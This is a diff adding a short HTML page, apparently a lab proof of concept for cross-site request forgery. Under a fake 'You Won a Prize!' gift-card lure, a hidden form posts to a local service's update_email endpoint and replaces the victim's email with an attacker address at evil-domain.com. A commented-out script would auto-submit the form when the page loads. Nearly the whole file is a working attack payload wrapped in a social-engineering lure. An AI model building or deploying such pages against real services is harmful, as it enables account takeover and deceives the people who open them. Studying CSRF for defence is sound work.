@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>You Won a Prize!</title>
+</head>
+<body>
+    <h2>Congratulations! You've won a free gift card.</h2>
+    <p>Click the button below to claim your prize.</p>
+    
+    <!-- 
+      The payload: A form pointing to the target service's action endpoint.
+      Because parameters are predictable (just "email"), the attacker can pre-fill it.
+    -->
+    <form action="http://127.0.0.1:5000/update_email" method="POST" id="csrf-form">
+        <input type="hidden" name="email" value="hacker@evil-domain.com">
+        <input type="submit" value="Claim Prize Now!">
+    </form>
+
+    <!-- 
+      Optional: Uncomment the script below to make it a "Zero-Click" attack.
+      This will auto-submit the form as soon as the page loads.
+    -->
+    <!-- <script>document.getElementById('csrf-form').submit();</script> -->
+</body>
+</html>
